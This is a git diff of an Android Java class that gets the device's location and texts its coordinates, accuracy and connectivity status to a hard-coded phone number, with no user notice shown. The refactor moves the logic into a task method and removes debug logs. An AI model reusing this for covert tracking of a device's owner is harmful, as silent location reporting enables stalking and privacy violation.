@@ -22,12 +22,11 @@ import java.lang.reflect.Method;
 /**
  * Created by joshuahugh on 24/11/14.
  */
-public class GetLocation implements
+public class GetLocation extends Task implements
         GooglePlayServicesClient.ConnectionCallbacks,
         GooglePlayServicesClient.OnConnectionFailedListener {
 
     private LocationClient locationClient;
-    private Context context;
     private Location currentLocation;
     private LocationManager locationManager;
 
@@ -36,8 +35,11 @@ public class GetLocation implements
 
 
     public GetLocation(Context context) {
-        this.context = context;
+        super(context);
+      }
 
+    @Override
+    public void performTask() {
         if (servicesConnected()) {
 
             locationClient = new LocationClient(context, this, this);
@@ -54,14 +56,9 @@ public class GetLocation implements
             Criteria criteria = new Criteria();
             provider = locationManager.getBestProvider(criteria, false);
 
-            Location location = locationManager.getLastKnownLocation(provider);
-
-            Log.v("Location Changed", location.getLatitude() + " and " + location.getLongitude());
-            sendLoc(location);
             locationManager.requestLocationUpdates(provider, 4000, 1, (LocationListener) locationListener);
 
         }
-
     }
 
     private boolean servicesConnected() {
@@ -80,7 +77,8 @@ public class GetLocation implements
             // resultCode holds the error code.
         } else {
             // Get the error dialog from Google Play services
-
+            Log.d("Location Updates",
+                    "Google Play services NOT available.");
             return false;
 
         }
@@ -89,13 +87,11 @@ public class GetLocation implements
 
     @Override
     public void onConnected(Bundle bundle) {
-        Log.d("LATLNG", "CONNECTED");
+
         Location loc = locationClient.getLastLocation();
 
-        Log.d("LATLNG", loc.toString());
 
-
-        sendLoc(loc);
+      sendLoc(loc);
 
     }
 
@@ -111,8 +107,6 @@ public class GetLocation implements
 
 
     private void sendLoc(Location location) {
-
-        //if(currentLocation
 
         boolean mobileDataEnabled = false; // Assume disabled
         ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -141,51 +135,45 @@ public class GetLocation implements
             e.printStackTrace();
         }
 
-
         final SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage("+441355377112", null, "Location LAT: " + location.getLatitude() + " LNG: " + location.getLongitude() + " ACC: " + location.getAccuracy() + " Data " + mobileDataEnabled + " Wifi " + wifiOn, null, null);
-        //sms.sendTextMessage("+441355377112", null, "Hello", null, null);
-
-
-        //locationManager.removeUpdates(locationListener);
-
 
     }
 
 
-    public class MyLocationListener implements LocationListener {
+    /**
+     * Class used for finding the location when Google Play Services is not available
+     */
+    private class MyLocationListener implements LocationListener {
 
+
+        /**
+         * When the location has changed, or in our case when the location has been found
+         * @param location : The new location
+         */
         @Override
         public void onLocationChanged(Location location) {
-            // TODO Auto-generated method stub
+            // \Ensure that the location is not null
             if (location != null) {
-                Log.v("Location Changed", location.getLatitude() + " and " + location.getLongitude());
-
-
                 sendLoc(location);
 
+                //TODO stop getting location updates
 
             }
-            Log.v("Location Changed", "nkjhio");
+
         }
 
+        //Unused
         @Override
-        public void onStatusChanged(String provider, int status, Bundle extras) {
-            // TODO Auto-generated method stub
+        public void onStatusChanged(String provider, int status, Bundle extras) {}
 
-        }
-
+        //Unused
         @Override
-        public void onProviderEnabled(String provider) {
-            // TODO Auto-generated method stub
+        public void onProviderEnabled(String provider) {}
 
-        }
-
+        //Unused
         @Override
-        public void onProviderDisabled(String provider) {
-            // TODO Auto-generated method stub
-
-        }
+        public void onProviderDisabled(String provider) {}
 
 
     }
